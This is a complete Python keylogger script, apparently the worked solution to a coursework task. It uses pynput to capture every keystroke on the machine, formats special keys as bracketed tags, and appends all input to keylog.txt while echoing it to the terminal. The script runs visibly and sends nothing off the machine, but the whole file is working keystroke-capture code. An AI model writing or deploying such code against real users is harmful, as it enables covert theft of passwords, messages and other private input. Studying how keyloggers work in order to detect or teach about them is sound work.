# keylogger.py
# A keylogger that saves formatted keystrokes to a file.

from pynput.keyboard import Listener, Key

# Define the file where we will save the keystrokes.
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    This function is called when a key is pressed.
    It formats the key and writes it to the log file.
    """
    # We use a try-except block to handle different key types.
    try:
        # This will work for normal alphanumeric keys.
        # The key.char attribute gives us the character as a string (e.g., 'a', 'b', '$').
        formatted_key = key.char
    except AttributeError:
        # This will happen for special keys (like Key.space, Key.ctrl, etc.).
        # These special keys don't have a .char attribute.
        # This formats special keys to be readable, e.g., "[SPACE]".
        formatted_key = f"[{str(key).replace('Key.', '').upper()}]"
        
    # --- SOLUTION FOR TASK 2 ---
    # This opens the log file in append mode ('a') and writes the formatted key.
    with open(LOG_FILE, 'a') as f:
        f.write(formatted_key)

    # Optional: This prints the key to the screen so you can see it live.
    # The end='' prevents a newline after each character.
    # The flush=True forces it to print immediately.
    print(formatted_key, end='', flush=True)

def start_logging():
	print("[*] Keylogger v2 started. Logging keystrokes to keylog.txt")
	print("[*] Press Ctrl + C in the terminal to stop.")

	with Listener(on_press=on_press) as listener:
	    listener.join()


if __name__ == '__main__':
	start_logging()
